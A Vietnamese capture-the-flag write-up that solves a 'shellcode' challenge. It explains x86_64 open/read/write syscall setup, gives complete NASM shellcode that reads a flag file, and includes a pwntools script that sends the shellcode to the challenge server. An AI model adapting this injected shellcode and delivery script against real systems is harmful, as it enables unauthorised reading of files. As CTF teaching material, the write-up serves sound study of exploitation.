# shellcode
## Description
dễ mà tự viết đi trên trên mạng không có đâu  

Bắt buộc dùng open, read, write để đọc flag  
Không cần quan tâm đến seccomp  
Dùng syscall ngoài open, read, write sẽ bị khóa  
`nc 45.122.249.68 10017`  

[Attachment](https://cnsc.uit.edu.vn/ctf/files/db7066ca17b81de21557500b08550d5a/shellcode.zip?token=eyJ1c2VyX2lkIjoxMTczLCJ0ZWFtX2lkIjo1MDUsImZpbGVfaWQiOjE4OH0.Yck_VQ.ABqT571dLtuVnxwAEgSGS7poz20)

## Solution
Dùng ghidra để reverse file thì ta có pseudocode như sau:  

![image](https://user-images.githubusercontent.com/44528004/147434866-bee4a4ab-f452-45d9-b790-1e902bc8aec8.png)

Ta thấy rằng, chương trình sẽ trực tiếp thực thi code mà ta truyền vào buffer, đồng thời với các hint được cấp thì ta biết rằng đây là 1 bài thuần viết shellcode.  

Tham khảo bài blog [sau](https://drx.home.blog/2019/04/03/pwnable-tw-orw/) và thực hiện 1 số thay đổi tương ứng với các lời gọi hàm cho kiến trúc x86_64. Tham khảo bảng syscall cho x86_64 để biết cách setup cho syscall:  

![image](https://user-images.githubusercontent.com/44528004/147435017-3bbf7c76-501f-439c-a4b1-456e89b1b4c7.png)

Đầu tiên, thứ tự gọi syscall của ta sẽ là `open` -> `read` -> `write`, tương ứng mở file, đọc file, và ghi file ra `stdout`.  

Đối với `open`:  
- `rax` sẽ bằng `0x2`.
- `rdi` sẽ chưa địa chỉ của chuỗi `filename`.
- `rsi` sẽ chỉ định các flags (các flags này dùng để chỉ định tạo file mới nếu file không tồn tại, chỉ đọc file mà không tạo file mới, ...). Ở đây ta chỉ cần đọc file nên `flags-0x0` là được.
- `rdx` ta sẽ set bằng `0x0` vì ta không cần quan tấm đến thanh ghi này.  

Shellcode cho `open`.:
```nasm
        xor rbx, rbx
        mov rbx, 0x7478742e
        push rbx
        mov rbx, 0x6e6f446f43676e6f
        push rbx
        mov rbx, 0x684b616850616850
        push rbx
        push rsp
        pop rdi
        xor rdx, rdx
        xor rsi, rsi
        mov rax, 0x2
        syscall
```

Đối với `read`:
- `rax` sẽ bằng `0x0`.
- `rdi` sẽ là file descriptor. File descriptor này chính là giá trị trả về bởi `open`.
- `rsi` sẽ là địa chỉ của buffer sẽ chứa chuỗi đọc được từ file. Ở đây ta sẽ ghi đỉnh stack vì trong shell code của chúng ta, stack sẽ không thay đổi trong quá trình thực thi, đồng thời stack là nơi mà ta có quyền ghi dữ liệu.
- `rdx` là độ dài tối đa mà ta muốn đọc.

Shellcode cho `read`:
```nasm
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 300
        mov rax, 0x0
        syscall
```

Đối với `write`:
- `rax` sẽ bằng `0x1`.
- `rdi` sẽ là file descriptor hoặc 1 giá trị đại diện cho 1 stream nào đó để ghi dữ liệu. Ở đây, ta sẽ in ra `stdout` nên file descriptor sẽ là `0x1`.
- `rsi` sẽ chứa địa chỉ của buffer mà ta muốn ghi.
- `rdx` là độ dài tối đa mà ta muốn ghi.

Shellcode cho `write`:
```nasm
        mov rax, 0x1
        mov rdi, 0x1
        mov rsi, rsp
        mov rdx, 300
        syscall
```

Shellcode hoàn chỉnh:
```nasm
global _start

section .text
_start:
        xor rbx, rbx
        mov rbx, 0x7478742e
        push rbx
        mov rbx, 0x6e6f446f43676e6f
        push rbx
        mov rbx, 0x684b616850616850
        push rbx
        push rsp
        pop rdi
        xor rdx, rdx
        xor rsi, rsi
        mov rax, 0x2
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 300
        mov rax, 0x0
        syscall

        mov rax, 0x1
        mov rdi, 0x1
        mov rsi, rsp
        mov rdx, 300
        syscall
```

Thử compile và thực thi shellcode:  

![image](https://user-images.githubusercontent.com/44528004/147435499-6ff50c56-0e99-40d1-a000-66ca59696ecf.png)
> Đọc flag thành công.  


Script exploit:  
```python
from pwn import *

shellcode = asm('\n'.join([
        # open:
        # at the end of this procedure,
        # %rax points to the file descriptor.
        'xor rbx, rbx',
        'mov rbx, %d' % u64(b'on.txt\x00\x00'),
        'push rbx',
        'mov rbx, %d' % u64(b'KhongCoD'),
        'push rbx',
        'mov rbx, %d' % u64(b'./PhaPha'),
        'push rbx',
        'push rsp',
        'pop rdi',
        'xor rdx, rdx',
        'xor rsi, rsi',
        'mov rax, 0x02',
        'syscall',

        # read:
        # at the end of this procedure,
        # %rbx stores the string that has just been read.
        'mov rdi, rax',
        'mov rsi, rsp',
        'mov rdx, 300',
        'mov rax, 0x0',
        'syscall',

        # write
        'mov rax, 0x1',
        'mov rdi, 0x1',
        'mov rsi, rsp',
        'mov rdx, 300',
        'syscall'
    ]), arch='amd64', os='linux', bits=64)

# p = process('./shellcode')
p = remote('45.122.249.68', 10017)
p.sendline(shellcode)
p.interactive()
```

Chạy code exploit local:  

![image](https://user-images.githubusercontent.com/44528004/147435617-fe89c520-78e0-4f2a-aac7-4cc5777e2029.png)
> Đọc flag thành công.
